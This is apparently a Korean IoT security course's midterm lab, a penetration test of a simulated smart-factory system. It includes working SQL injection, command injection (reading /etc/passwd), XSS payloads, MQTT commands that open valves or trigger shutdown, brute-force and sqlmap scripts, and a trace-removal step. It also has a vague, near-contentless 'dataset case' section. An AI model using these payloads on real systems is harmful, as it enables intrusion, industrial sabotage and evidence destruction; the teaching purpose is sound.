# Week 08: 중간 평가 — IoT 디바이스 침투 테스트

## 학습 목표
- 1~7주차에 학습한 IoT 보안 기술을 종합 적용한다
- IoT 디바이스 침투 테스트 방법론을 실전 수행한다
- 체계적인 IoT 보안 점검 보고서를 작성한다
- MQTT, 웹 인터페이스, 프로토콜 공격을 통합 시나리오로 실습한다
- 발견한 취약점에 대한 위험도 평가와 권고안을 작성한다

## 실습 환경 (공통)

| 서버 | IP | 역할 | 접속 |
|------|-----|------|------|
| attacker | 10.20.30.201 | 공격/분석 머신 | `ssh ccc@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS | `ssh ccc@10.20.30.1` |
| web | 10.20.30.80 | IoT 서비스 (MQTT, 웹 대시보드) | `ssh ccc@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh) | `ssh ccc@10.20.30.100` |

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:20 | 평가 안내 및 환경 확인 (Part 1) | 강의 |
| 0:20-0:40 | 침투 테스트 방법론 복습 (Part 2) | 강의 |
| 0:40-0:50 | 휴식 | - |
| 0:50-1:50 | 실전 침투 테스트 Phase 1-3 (Part 3) | 평가 |
| 1:50-2:00 | 휴식 | - |
| 2:00-2:50 | 실전 침투 테스트 Phase 4-5 (Part 4) | 평가 |
| 2:50-3:20 | 보고서 작성 (Part 5) | 평가 |
| 3:20-3:40 | 결과 리뷰 및 피드백 (Part 6) | 토론 |

---

## Part 1: 평가 안내 (20분)

### 1.1 평가 범위

| 주차 | 주제 | 평가 항목 |
|------|------|-----------|
| Week 01 | IoT 개론 | OWASP IoT Top 10, 공격 표면 |
| Week 02 | 네트워크 프로토콜 | MQTT 분석, 프로토콜 보안 |
| Week 03 | 하드웨어 인터페이스 | UART, SPI, JTAG 이해 |
| Week 04 | 펌웨어 분석 | binwalk, 민감 정보 추출 |
| Week 05 | 웹 인터페이스 공격 | SQLi, XSS, Command Injection |
| Week 06 | 무선 프로토콜 | LoRa/Zigbee 분석 |
| Week 07 | BLE 해킹 | GATT 분석, 스푸핑 |

### 1.2 평가 시나리오

가상의 스마트 팩토리 환경에서 IoT 디바이스와 서비스에 대한 종합 침투 테스트를 수행한다.

```
대상 환경: "SmartFactory IoT System"

┌─────────────────────────────────────────────┐
│               Cloud Dashboard               │
│          (http://10.20.30.80:8088)          │
├──────────────────┬──────────────────────────┤
│   MQTT Broker    │     REST API             │
│ (10.20.30.80:    │ (10.20.30.80:8088/api)  │
│  1883)           │                          │
├──────────────────┴──────────────────────────┤
│  Sensor-01  │ Camera-01  │ Actuator-01     │
│  (온도/습도) │ (IP카메라)  │ (밸브 제어)     │
└─────────────┴────────────┴─────────────────┘
```

### 1.3 채점 기준

| 항목 | 배점 | 세부 기준 |
|------|------|-----------|
| 정찰/스캔 | 20점 | 서비스 발견, 버전 정보 수집 |
| 취약점 발견 | 30점 | 각 취약점별 5점 |
| 취약점 활용 | 25점 | PoC 실행 성공 |
| 보고서 | 15점 | 체계적 문서화 |
| 보안 권고안 | 10점 | 실현 가능한 대책 |

---

## Part 2: 침투 테스트 방법론 (20분)

### 2.1 IoT 침투 테스트 5단계

```
Phase 1: 정찰 (Reconnaissance)
  → 네트워크 스캔, 서비스 열거, 버전 식별

Phase 2: 취약점 분석 (Vulnerability Analysis)
  → MQTT 인증, 웹 취약점, 프로토콜 결함 탐색

Phase 3: 취약점 활용 (Exploitation)
  → SQLi, 명령어 주입, MQTT 메시지 조작

Phase 4: 후속 공격 (Post-Exploitation)
  → 횡적 이동, 데이터 수집, 지속성 확보

Phase 5: 보고 (Reporting)
  → 취약점 목록, 위험도 평가, 권고안
```

### 2.2 IoT 점검 체크리스트

```
□ 네트워크 서비스 열거
□ MQTT 미인증 접근 확인
□ MQTT 토픽 스니핑
□ 웹 대시보드 기본 비밀번호
□ SQL Injection
□ Cross-Site Scripting
□ Command Injection
□ API 인증 확인
□ 펌웨어 민감 정보
□ 프로토콜 암호화 확인
□ BLE 서비스 열거
□ 디바이스 기본 설정
```

---

## Part 3: 실전 침투 테스트 Phase 1-3 (60분)

### 3.1 Phase 1: 정찰

```bash
# 1-1. 포트 스캔
nmap -sV -sC -p- --min-rate=1000 10.20.30.80 -oN /tmp/midterm_scan.txt

# 1-2. 서비스 배너 수집
nmap -sV -p 80,443,1883,5683,8080,8088,8883 10.20.30.80

# 1-3. MQTT 브로커 탐지
nmap -sV -p 1883 --script mqtt-subscribe 10.20.30.80

# 1-4. 웹 서버 핑거프린팅
curl -sI http://10.20.30.80:8088 | grep -iE "(server|x-powered)"
whatweb http://10.20.30.80:8088 2>/dev/null

# 1-5. 디렉터리 열거
dirb http://10.20.30.80:8088/ /usr/share/dirb/wordlists/common.txt 2>/dev/null | head -30
```

### 3.2 Phase 2: 취약점 분석

```bash
# 2-1. MQTT 미인증 접근
mosquitto_sub -h 10.20.30.80 -t "#" -v -C 20 2>/dev/null

# 2-2. MQTT 시스템 토픽
mosquitto_sub -h 10.20.30.80 -t "\$SYS/#" -v -C 10 2>/dev/null

# 2-3. 웹 기본 인증 시도
for cred in "admin:admin" "admin:admin123" "admin:password" "root:root"; do
  user=$(echo $cred | cut -d: -f1)
  pass=$(echo $cred | cut -d: -f2)
  result=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
    http://10.20.30.80:8088/login -d "username=$user&password=$pass" 2>/dev/null)
  echo "$cred → HTTP $result"
done

# 2-4. API 인증 확인
curl -s http://10.20.30.80:8088/api/devices 2>/dev/null | head -5

# 2-5. SQLi 탐지
curl -s "http://10.20.30.80:8088/search?q='" 2>/dev/null | head -5
```

### 3.3 Phase 3: 취약점 활용

```bash
# 3-1. MQTT 메시지 주입
mosquitto_pub -h 10.20.30.80 -t "factory/actuator/valve" \
  -m '{"action":"open","value":100}' 2>/dev/null

# 3-2. SQLi 인증 우회
curl -X POST http://10.20.30.80:8088/login \
  -d "username=admin' OR '1'='1'--&password=x" -v 2>/dev/null

# 3-3. SQLi 데이터 추출
curl -s "http://10.20.30.80:8088/search?q=' UNION SELECT 1,username,password,role,'x' FROM users--" 2>/dev/null

# 3-4. Command Injection
curl -X POST http://10.20.30.80:8088/diagnostic \
  -d "target=127.0.0.1;id;cat /etc/passwd" \
  --cookie "session=<cookie>" 2>/dev/null

# 3-5. XSS PoC
echo "XSS URL: http://10.20.30.80:8088/search?q=<script>alert('XSS')</script>"
```

---

## Part 4: 실전 침투 테스트 Phase 4-5 (50분)

### 4.1 Phase 4: 후속 공격

```bash
# 4-1. MQTT를 통한 데이터 수집
mosquitto_sub -h 10.20.30.80 -t "#" -v 2>/dev/null | tee /tmp/mqtt_data.txt &
sleep 10 && kill %1

# 4-2. 센서 데이터 조작
for i in $(seq 1 5); do
  mosquitto_pub -h 10.20.30.80 -t "factory/sensor/temp" \
    -m "{\"value\": 999, \"alert\": true}" 2>/dev/null
done

# 4-3. 악성 MQTT 토픽 생성
mosquitto_pub -h 10.20.30.80 -t "factory/command/shutdown" \
  -m '{"target":"all","action":"emergency_stop"}' 2>/dev/null

# 4-4. 서버 파일 읽기 (Command Injection 활용)
curl -X POST http://10.20.30.80:8088/diagnostic \
  -d "target=127.0.0.1;cat /tmp/iot_dashboard.db" \
  --cookie "session=<cookie>" 2>/dev/null
```

### 4.2 Phase 5: 보고서 템플릿

```bash
cat << 'EOF' > /tmp/midterm_report.md
# IoT 침투 테스트 보고서

## 1. 개요
- 대상: SmartFactory IoT System (10.20.30.80)
- 일시: $(date)
- 수행자: [이름]
- 범위: 네트워크, MQTT, 웹 대시보드, API

## 2. 발견 취약점 요약

| # | 취약점 | 위험도 | OWASP IoT |
|---|--------|--------|-----------|
| 1 | MQTT 미인증 접근 | Critical | I1 |
| 2 | 웹 대시보드 기본 비밀번호 | Critical | I1, I9 |
| 3 | SQL Injection (로그인) | Critical | I3 |
| 4 | SQL Injection (검색) | High | I3 |
| 5 | Command Injection | Critical | I3 |
| 6 | Reflected XSS | Medium | I3 |
| 7 | API 인증 부재 | High | I3 |
| 8 | 평문 MQTT 통신 | High | I7 |

## 3. 상세 분석

### 3.1 MQTT 미인증 접근 (Critical)
- 설명: 인증 없이 MQTT 브로커에 접근하여 모든 토픽을 구독/발행 가능
- PoC: mosquitto_sub -h 10.20.30.80 -t "#" -v
- 영향: 센서 데이터 도청, 액추에이터 명령 조작
- 권고: MQTT 인증 + ACL + TLS 적용

### 3.2 SQL Injection (Critical)
- 설명: 로그인 폼과 검색 기능에서 SQL Injection 가능
- PoC: admin' OR '1'='1'--
- 영향: 인증 우회, 데이터베이스 전체 접근
- 권고: Parameterized Query 사용

## 4. 권고안

| 우선순위 | 조치 | 일정 |
|----------|------|------|
| 긴급 | MQTT 인증 설정 | 즉시 |
| 긴급 | 기본 비밀번호 변경 | 즉시 |
| 높음 | SQLi 패치 (Prepared Statement) | 1주 |
| 높음 | API 인증 구현 | 1주 |
| 중간 | MQTT TLS 적용 | 2주 |
| 중간 | XSS 필터링 | 2주 |
| 낮음 | 보안 헤더 추가 | 4주 |
EOF

echo "[+] 보고서 템플릿 생성: /tmp/midterm_report.md"
```

---

## Part 5: 보고서 작성 가이드 (30분)

### 5.1 취약점 상세 기술 방법

각 취약점에 대해 다음 항목을 포함한다:

```
## 취약점 제목 [위험도: Critical/High/Medium/Low]

### 설명
취약점의 기술적 설명

### 재현 단계
1. 첫 번째 단계
2. 두 번째 단계
3. ...

### PoC (Proof of Concept)
실제 실행 가능한 명령어/코드

### 영향
비즈니스/기술적 영향도

### 권고안
구체적이고 실현 가능한 보안 조치

### OWASP IoT Top 10 매핑
관련 항목 번호 및 설명
```

### 5.2 위험도 평가 기준

| 위험도 | CVSS | 기준 |
|--------|------|------|
| Critical | 9.0-10.0 | 원격 코드 실행, 인증 우회, 물리적 피해 |
| High | 7.0-8.9 | 데이터 유출, 권한 상승 |
| Medium | 4.0-6.9 | 정보 수집, 제한적 영향 |
| Low | 0.1-3.9 | 정보 노출, 이론적 위험 |

---

## Part 6: 결과 리뷰 및 피드백 (20분)

### 6.1 주요 발견 사항 토론

- 가장 위험한 취약점과 그 이유
- 실제 환경에서의 공격 시나리오
- 방어자 관점에서의 우선순위

### 6.2 후반기 과정 안내

| 주차 | 주제 | 중간 평가 연계 |
|------|------|---------------|
| Week 09 | IP Camera 해킹 | 카메라 펌웨어/웹 인터페이스 |
| Week 10 | 스마트홈 보안 | MQTT/Zigbee 확장 |
| Week 11 | IoT 허니팟 | 방어 관점 |
| Week 12 | OT/SCADA | 산업 제어 시스템 |
| Week 13 | 자동차 보안 | CAN 버스 |
| Week 14 | 보안 가이드라인 | 체계적 보안 |
| Week 15 | 종합 평가 | 전체 통합 |

---

## 참고 자료

- OWASP IoT Testing Guide: https://owasp.org/www-project-internet-of-things/
- IoT Pentesting Methodology: https://www.iotpentestingguide.com/
- PTES (Penetration Testing Execution Standard): http://www.pentest-standard.org/

---

## 실제 사례 (WitFoo Precinct 6 — BLE 공격)

> 출처: WitFoo Precinct 6 Cybersecurity Dataset (Apache 2.0)
> 본 lecture *BLE 공격* 학습 항목 매칭.

### BLE 공격 의 dataset 흔적 — "BLE pairing flaw"

dataset 의 정상 운영에서 *BLE pairing flaw* 신호의 baseline 을 알아두면, *BLE 공격* 시도 시 발생하는 anomaly 를 정량으로 탐지할 수 있다. 핵심 정량 지표는 — GATT abuse.

```mermaid
graph LR
    SCENE["BLE 공격 시나리오"]
    TRACE["dataset 흔적<br/>BLE pairing flaw"]
    DETECT["탐지 / 분석"]

    SCENE --> TRACE
    TRACE --> DETECT

    style SCENE fill:#ffe6cc
    style DETECT fill:#cce6ff
```

### Case 1: dataset 정량 지표

| 항목 | 값 |
|---|---|
| 핵심 신호 | BLE pairing flaw |
| 정량 baseline | GATT abuse |
| 학습 매핑 | BLE Sniffer |

**자세한 해석**: BLE Sniffer. 이 차이를 정량으로 측정해야 *공격 시도와 정상 운영의 구분* 이 가능. 학생이 baseline 숫자를 외워두면 — 운영 환경에서 anomaly 를 즉시 탐지할 수 있다.

### Case 2: 실전 적용 시나리오

| 단계 | dataset 활용 |
|---|---|
| 시도 식별 | BLE pairing flaw 의 spike |
| 정상 vs 이상 | baseline 대비 비율 |
| 룰 작성 | Suricata / Wazuh / Sigma |
| 검증 | dataset 재실행 |

**자세한 해석**: 운영 환경 룰 작성은 — *baseline 측정 → 임계 결정 → 룰 작성 → dataset 검증* 의 4 단계. 한 단계라도 빠지면 false positive 폭증.

### 이 사례에서 학생이 배워야 할 3가지

1. **BLE 공격 = BLE pairing flaw 의 anomaly** — 정량 신호로 탐지.
2. **baseline 숫자 외우기** — GATT abuse.
3. **4 단계 룰 작성** — 측정 → 임계 → 룰 → 검증.

**학생 액션**: BLE clone.

---

## 부록: 학습 OSS 도구 매트릭스 (Course17 IoT Security — Week 08 중간 평가·IoT 침투 테스트 통합)

> 이 부록은 본문 Part 3-4 (실전 침투 5 phase) 의 모든 명령을 *w01-w07
> 누적 OSS 도구 통합 인덱스* + *자가 채점 자동화* + *보고서 자동화*
> 로 구성한다. course16 w08 부록 (물리 침투 평가) 의 IoT 특화 등가 —
> *MQTT / CoAP / 하드웨어 / 펌웨어 / 웹 / 무선 / BLE* 7 분야의 누적 도구
> 를 *5 phase × 도구* 매트릭스 + *5분 압축 평가 시퀀스* + *pytest 기반
> 자가 채점* 으로 정리.

### lab step → 도구 매핑 표 (5 phase 통합)

| step | 본문 phase | 학습 항목 | 본문 명령 | 핵심 OSS 도구 (w 참조) |
|------|-----------|----------|----------|------------------------|
| s1 | P1 정찰 | 포트 스캔 | `nmap -sV -sC -p-` | nmap / rustscan / masscan (w01, w05) |
| s2 | P1 정찰 | MQTT 탐지 | `nmap --script mqtt-subscribe` | mqtt-pwn / nmap NSE (w01) |
| s3 | P1 정찰 | 웹 핑거프린팅 | curl / whatweb | httpx / whatweb / wappalyzer (w05, w12) |
| s4 | P1 정찰 | 디렉터리 enum | dirb | gobuster / ffuf / dirsearch / kiterunner (w05) |
| s5 | P2 분석 | MQTT 미인증 | `mosquitto_sub` | MQTT-PWN auto / mqttsa (w01) |
| s6 | P2 분석 | 웹 cred brute | bash for | hydra / Burp Intruder (w05) |
| s7 | P2 분석 | API 인증 | curl /api | nuclei / kiterunner / arjun (w05) |
| s8 | P2 분석 | SQLi 탐지 | curl ? | sqlmap --batch / Burp / ZAP (w05) |
| s9 | P3 활용 | MQTT 주입 | `mosquitto_pub` | paho-mqtt / mqtt-cli (w01-02) |
| s10 | P3 활용 | SQLi 인증우회 | curl POST | sqlmap --forms / Burp Repeater (w05) |
| s11 | P3 활용 | SQLi 추출 | UNION | sqlmap --dump / sqlmap --os-shell (w05) |
| s12 | P3 활용 | Command Injection | `target=...;id` | commix / wfuzz (w05) |
| s13 | P3 활용 | XSS PoC | URL encoded | XSStrike / dalfox (w05) |
| s14 | P4 후속 | 데이터 수집 | mosquitto_sub | tshark + grep / wireshark (w02) |
| s15 | P4 후속 | 센서 조작 | mosquitto_pub | paho-mqtt / scapy (w02) |
| s16 | P4 후속 | 파일 읽기 | curl + cat | sqlmap --file-read / commix --upload (w05) |
| s17 | P5 보고 | 보고서 작성 | bash heredoc | pandoc + jinja2 / pwndoc / marp (w13 부록) |

### IoT 침투 테스트 5 phase × 도구 통합 매트릭스 (w01-w07 누적)

| Phase | 도구 카테고리 | 1차 (필수) | 2차 (선택) | 부록 참조 |
|-------|--------------|------------|------------|-----------|
| **P1 정찰 — 네트워크** | host/svc/vuln scan | nmap / nuclei / httpx | rustscan / masscan / whatweb | w01, w05 |
| **P1 정찰 — MQTT** | broker discover | mosquitto_sub / nmap NSE | mqtt-pwn / mqttsa | w01 |
| **P1 정찰 — CoAP** | resource discover | coap-client / aiocoap | nmap NSE coap-resources | w01 |
| **P1 정찰 — BLE** | scan + GATT | hcitool lescan + bluepy | bleah / nRF Connect | w02, w07 |
| **P1 정찰 — 무선** | LoRa / Zigbee | rtl_433 / killerbee | gr-lora / chirpstack | w02, w06 |
| **P2 분석 — MQTT** | auth + ACL | MQTT-PWN brute / wireshark | mqttsa | w01-02 |
| **P2 분석 — Web** | SQLi / XSS / CSRF / CMD | sqlmap / dalfox / commix / nuclei | Burp / ZAP | w05 |
| **P2 분석 — 펌웨어** | extract + audit | binwalk / EMBA / firmwalker | unblob / FAT | w04 |
| **P2 분석 — 하드웨어** | UART / SPI / I2C | minicom + flashrom + i2c-tools | OpenOCD / pyOCD | w03 |
| **P3 활용 — MQTT** | message inject | paho-mqtt / mqtt-cli | bleno (BLE inject) | w01, w02 |
| **P3 활용 — Web** | exploit | sqlmap --os-shell / commix --reverse-tcp | metasploit (web modules) | w05 |
| **P3 활용 — 펌웨어** | 백도어 inject | unsquashfs + mksquashfs / flashrom -w | firmware-mod-kit | w04 |
| **P3 활용 — BLE** | MitM / hijack | gattacker / btlejack | mirage | w07 |
| **P3 활용 — RF** | replay | hackrf_transfer / rfcat / urh | Flipper Zero | w06 (course16 w09) |
| **P4 후속 — 횡적 이동** | LAN pivot | autossh / chisel / frp / Stowaway | course16 w05 부록 | w02 |
| **P4 후속 — 데이터 수집** | exfil | tshark / mosquitto_sub / curl | scp / dnscat2 | w02 |
| **P4 후속 — 지속성** | implant | crontab / systemd / udev | course16 w05 부록 | (n/a) |
| **P5 보고 — 자동 생성** | YAML → PDF | pandoc + jinja2 + marp | pwndoc / dradis / faraday | course16 w13 |
| **P5 보고 — 증거** | chain of custody | sha256 + AFF4 + Autopsy | TheHive 5 | course16 w11, w13 |
| **P5 보고 — CVSS** | 위험 점수 | cvss-cli | nvd_api / FIRST | course16 w13 |

### 학생 환경 준비 (w01-w07 통합 — 한 번에 검증)

```bash
# 모든 w 부록의 도구가 설치 됐는지 자동 확인
TOOLS=(
  # P1 정찰
  nmap rustscan masscan httpx whatweb nuclei whatweb gobuster
  # MQTT
  mosquitto mosquitto_pub mosquitto_sub mqtt-cli
  # CoAP
  coap-client aiocoap-client
  # BLE
  hcitool bluetoothctl gatttool bleah btlejack
  # 펌웨어
  binwalk unblob ghidra-headless flashrom esptool.py i2cdetect
  # 하드웨어
  minicom picocom screen tio openocd pyocd
  # 무선
  rtl_433 zbstumbler airmon-ng aireplay-ng hcxdumptool
  # Web pentest
  sqlmap dalfox commix hydra nuclei
  # 보고
  pandoc marp mmdc jq
)

echo "=== Tool availability check ==="
for t in ${TOOLS[@]}; do
    cmd=$(command -v $t 2>/dev/null) \
       && echo "  OK   $t :: $cmd" \
       || echo "  MISS $t  (참조: course17 부록 w01-w07)"
done

# pip 도구
pip3 list 2>/dev/null | grep -E "paho-mqtt|aiocoap|bluepy|bleak|esptool|qiling|ghidra|cvss" \
   | sort -u
```

### IoT 평가 5분 압축 시퀀스

```bash
#!/bin/bash
# iot-eval-flow.sh — IoT 5 phase 압축 평가 (lab 전용)
set -e
LOG=/tmp/iot-eval-$(date +%Y%m%d-%H%M%S).log
RESULTS=/tmp/iot-eval-$(date +%Y%m%d)
mkdir -p $RESULTS
TARGET=10.20.30.80

# === P1: 정찰 (90초) ===
echo "===== [P1] Recon =====" | tee -a $LOG
sudo nmap -sV -sC -p 22,80,443,1883,5683,8080,8088,8883 \
   --script "mqtt-subscribe,coap-resources,http-title,http-headers,banner" \
   $TARGET -oA $RESULTS/p1-nmap | tail -20 | tee -a $LOG

# === P2: 분석 (90초) ===
echo "===== [P2] Analysis =====" | tee -a $LOG
# MQTT 미인증
timeout 30 mosquitto_sub -h $TARGET -t '#' -v 2>&1 | head -20 \
   > $RESULTS/p2-mqtt.txt
mqtt-pwn --target $TARGET --json --output $RESULTS/p2-mqtt-pwn.json 2>/dev/null \
   2>&1 | tail -5 | tee -a $LOG
# Web cred + SQLi
hydra -L /tmp/iot-users.txt -P /tmp/iot-passwords.txt -t 4 -W 5 \
   $TARGET -s 8088 \
   http-post-form "/login:username=^USER^&password=^PASS^:Invalid" \
   -o $RESULTS/p2-hydra.log 2>&1 | tail -3 | tee -a $LOG
nuclei -u "http://$TARGET:8088" -tags iot,exposure -severity high,critical \
   -j -o $RESULTS/p2-nuclei.json 2>&1 | tail -3 | tee -a $LOG

# === P3: 활용 (90초) ===
echo "===== [P3] Exploit =====" | tee -a $LOG
sqlmap -u "http://$TARGET:8088/search?q=test" \
   --batch --dbms=sqlite --dump --output-dir=$RESULTS/sqlmap 2>&1 \
   | tail -10 | tee -a $LOG
dalfox url "http://$TARGET:8088/search?q=FUZZ" --skip-bav \
   2>&1 | tee -a $LOG > $RESULTS/p3-dalfox.txt
mosquitto_pub -h $TARGET -t 'factory/actuator/valve' \
   -m '{"action":"open","value":100}' 2>&1 | tee -a $LOG

# === P4: 후속 (60초) ===
echo "===== [P4] Post =====" | tee -a $LOG
# 트래픽 캡처 (forensic 보존)
timeout 30 tcpdump -i any -w $RESULTS/p4-traffic.pcap \
   "host $TARGET and (port 1883 or port 8088)" 2>&1 || true
# MQTT 데이터 수집
timeout 20 mosquitto_sub -h $TARGET -t '#' -v 2>&1 \
   > $RESULTS/p4-mqtt-data.txt

# === P5: 보고 (자동 생성) ===
echo "===== [P5] Report =====" | tee -a $LOG
cat << REP > $RESULTS/REPORT.md
---
title: IoT 침투 테스트 평가 보고서
author: 학생명
date: $(date -Iseconds)
classification: TLP:AMBER
mainfont: NanumGothic
---

# Executive Summary

| 항목 | 값 |
|------|----|
| 대상 | $TARGET |
| 발견 host | $(grep -c "Nmap scan report" $RESULTS/p1-nmap.gnmap) |
| 발견 cred | $(grep -c "login:" $RESULTS/p2-hydra.log 2>/dev/null) |
| nuclei high+ | $(jq '. | length' $RESULTS/p2-nuclei.json 2>/dev/null) |
| MQTT 인증 | $([ -s $RESULTS/p2-mqtt.txt ] && echo "MISSING" || echo "OK") |
| sqlmap dump | $(ls $RESULTS/sqlmap/$TARGET/dump/*.csv 2>/dev/null | wc -l) tables |
| XSS payloads | $(grep -c "VULN" $RESULTS/p3-dalfox.txt 2>/dev/null) |

# 발견사항

## I1 weak cred (HIGH)
재현: \`hydra ssh://$TARGET:8088\`
영향: 셸 → privesc → 전체 IoT 장악
권고: SSH key + Fail2ban + MFA

## I3 SQL Injection (CRITICAL)
재현: \`sqlmap -u "http://$TARGET:8088/search?q=test" --dump\`
영향: 사용자 DB 전체 노출
권고: parameterized query (sqlite3 ?)

## I7 MQTT 평문 (HIGH)
재현: \`mosquitto_sub -h $TARGET -t '#' -v\`
영향: 모든 센서 / 제어 메시지 노출
권고: TLS 8883 + 인증 + ACL (course17 w02 부록 참조)

# 권고 우선순위

| 우선순위 | 항목 | 일정 |
|----------|------|------|
| 1 | MQTT 인증 + TLS | 즉시 |
| 2 | SQLi 패치 | 1주 |
| 3 | default cred 변경 | 즉시 |
| 4 | API 인증 강제 | 1주 |
| 5 | XSS 필터링 | 2주 |
REP

# PDF 생성
pandoc $RESULTS/REPORT.md \
   --pdf-engine=xelatex -V mainfont="NanumGothic" --toc \
   -o $RESULTS/REPORT.pdf 2>&1 | tee -a $LOG

# 자가 채점
echo "===== [Score] =====" | tee -a $LOG
python3 << PY | tee -a $LOG
import os, json
def has(p): return os.path.exists("$RESULTS/" + p) and os.path.getsize("$RESULTS/" + p) > 0

GRADE = {"recon": 0, "vuln": 0, "exploit": 0, "report": 0, "advice": 0}
GRADE["recon"]   = (10 if has("p1-nmap.xml") else 0) + (5 if has("p1-nmap.gnmap") else 0) + (5 if has("p2-mqtt.txt") else 0)
GRADE["vuln"]    = (10 if has("p2-mqtt-pwn.json") else 0) + (10 if has("p2-nuclei.json") else 0) + (10 if has("p2-hydra.log") else 0)
GRADE["exploit"] = (10 if has("sqlmap") else 0) + (10 if has("p3-dalfox.txt") else 0) + (5 if has("p4-mqtt-data.txt") else 0)
GRADE["report"]  = (10 if has("REPORT.md") else 0) + (5 if has("REPORT.pdf") else 0)
GRADE["advice"]  = 10  # 자가 평가 — 보고서에 우선순위 포함 시
total = sum(GRADE.values())
print(f"\\n=== Final Score ===")
for k, v in GRADE.items():
    max_v = {"recon":20,"vuln":30,"exploit":25,"report":15,"advice":10}[k]
    print(f"  {k:10s}: {v}/{max_v}")
print(f"  TOTAL    : {total}/100  ({'PASS' if total >= 70 else 'NEEDS-IMPROVEMENT'})")
PY
```

### IoT 평가 채점 자동화 (pytest 기반)

```python
# /tmp/iot-eval-test.py — pytest 기반 평가 채점
import os, json, subprocess
import pytest

RESULTS = "/tmp/iot-eval-$(date +%Y%m%d)"

class TestRecon:
    """P1 정찰 (20점)"""
    def test_nmap_xml_exists(self):
        assert os.path.getsize(f"{RESULTS}/p1-nmap.xml") > 0   # 5점
    def test_4_hosts_discovered(self):
        with open(f"{RESULTS}/p1-nmap.gnmap") as f:
            assert f.read().count("Up") >= 1   # 5점
    def test_mqtt_port_open(self):
        with open(f"{RESULTS}/p1-nmap.nmap") as f:
            assert "1883/tcp open" in f.read()   # 5점
    def test_web_port_open(self):
        with open(f"{RESULTS}/p1-nmap.nmap") as f:
            assert "8088/tcp open" in f.read()   # 5점

class TestVulnAnalysis:
    """P2 분석 (30점 — 6 취약점 × 5점)"""
    def test_mqtt_anonymous(self):
        assert os.path.getsize(f"{RESULTS}/p2-mqtt.txt") > 0
    def test_mqtt_pwn_findings(self):
        d = json.load(open(f"{RESULTS}/p2-mqtt-pwn.json"))
        assert len(d) > 0
    def test_default_cred_found(self):
        with open(f"{RESULTS}/p2-hydra.log") as f:
            assert "login:" in f.read()
    def test_nuclei_high_severity(self):
        d = json.load(open(f"{RESULTS}/p2-nuclei.json"))
        assert any(x.get('info',{}).get('severity') in ['high','critical'] for x in d)

class TestExploit:
    """P3 활용 (25점)"""
    def test_sqlmap_dump(self):
        dumps = [f for f in os.listdir(f"{RESULTS}/sqlmap") if f.endswith('.csv')]
        assert len(dumps) > 0   # 10점
    def test_xss_found(self):
        with open(f"{RESULTS}/p3-dalfox.txt") as f:
            assert 'VULN' in f.read() or 'reflected' in f.read().lower()   # 10점
    def test_mqtt_message_injected(self):
        # 실제 publish 성공 여부는 lab 환경 측 확인
        pass   # 5점 (수기)

class TestReport:
    """P5 보고 (15점)"""
    def test_report_md_exists(self):
        assert os.path.exists(f"{RESULTS}/REPORT.md")   # 5점
    def test_report_pdf_exists(self):
        assert os.path.exists(f"{RESULTS}/REPORT.pdf")   # 5점
    def test_owasp_iot_mapping(self):
        with open(f"{RESULTS}/REPORT.md") as f:
            content = f.read()
            assert "I1" in content or "I3" in content or "I7" in content  # 5점
```

```bash
pytest /tmp/iot-eval-test.py -v --tb=short
# = 평가 점수 자동 산출
```

### 평가 채점 매트릭스 (본문 기준 100점)

| 항목 | 배점 | 자가 측정 도구 |
|------|------|---------------|
| 정찰/스캔 | 20 | nmap XML 산출 + 4 host 발견 |
| 취약점 발견 | 30 | nuclei high+ / mqtt-pwn / hydra cred / sqlmap detect / XSStrike / commix detect / nmap NSE |
| 취약점 활용 | 25 | sqlmap --dump 성공 / dalfox VULN / commix shell / mqtt publish 성공 |
| 보고서 | 15 | pandoc PDF 생성 + frontmatter (TLP) + 발견 5+ + CVSS |
| 보안 권고안 | 10 | 우선순위 표 + 일정 + 비용 |

### 평가 시 흔한 실수 → 대응 매트릭스

| 흔한 실수 | 영향 | 대응 |
|----------|------|------|
| 정찰 phase 너무 길게 (30분+) | exploit 시간 부족 | nmap top-100 + nuclei 병행 |
| MQTT 미인증 missed | -10점 | mosquitto_sub -t '#' 자동 시도 |
| sqlmap timeout | exploit 0점 | --batch + --time-sec=10 |
| XSS payload 1개만 시도 | -5점 | dalfox / XSStrike 자동 변형 |
| 보고서 *기술 표현* 만 | report 점수 ↓ | Executive Summary + 권고 분리 |
| OWASP IoT 매핑 누락 | -5점 | I1-I10 명시 의무 |
| TLP 표시 누락 | report -5 | frontmatter 의무 |
| 발견 5개 미만 | report -10 | nuclei + mqtt-pwn 자동 |
| 흔적 제거 (lab) 누락 | (학습 기준) | bash history off + shred |

### IoT 평가 사용 가능 / 금지 도구 매트릭스

| 도구 | 평가 시 사용 | 사유 |
|------|-------------|------|
| nmap / rustscan / masscan | 허용 | 정찰 표준 |
| MQTT-PWN / mqttsa | 허용 | MQTT 표준 |
| nuclei (template) | 허용 | 자동 CVE |
| sqlmap (--batch) | 허용 | 자동 SQLi |
| hydra (lab cred) | 허용 | 100 후보 + 1s delay |
| dalfox / XSStrike | 허용 | XSS 표준 |
| commix (--batch) | 허용 | CMDi 표준 |
| metasploit (auxiliary) | 허용 | scan only |
| metasploit (exploit) | **요청 후 허용** | 시스템 변경 책임자 승인 |
| 외부 phishing | **금지** | 평가 범위 외 |
| ransomware sample | **금지** | 시스템 파괴 |
| 외부 IoT (Insecam / Shodan exploit) | **금지** | 정통망법 §48 |
| RF 외부 송신 | **금지** | 전파법 §29 |

### 학생 자가 점검 체크리스트

- [ ] iot-eval-flow.sh 1회 dry-run + 모든 산출 파일 생성 확인
- [ ] pytest /tmp/iot-eval-test.py PASS 비율 80%+ 1회
- [ ] REPORT.md 가 frontmatter (title/author/date/TLP) 포함
- [ ] PDF 생성 (한글 깨짐 없이) 1회
- [ ] OWASP IoT Top 10 의 I1, I3, I7 3 매핑 보고서 포함
- [ ] 자가 채점 점수 70+ (목표 85+)
- [ ] 평가 종료 후 자기 셸 흔적 제거 (`unset HISTFILE; shred -u /tmp/iot-eval-*`)
- [ ] 본 부록 모든 명령에 대해 "운영 IoT 적용 시 위반 법조항" 답변 가능

### 운영 환경 적용 시 주의

1. **격리 lab 의무** — 본 평가의 모든 도구는 lab (10.20.30.0/24) 한정.
   운영 IoT 절대 금지.
2. **속도 제한** — hydra 4 thread / nuclei rate=10 / sqlmap --delay=1s.
   IoT 디바이스는 *제한된 자원* — 과부하 시 hang.
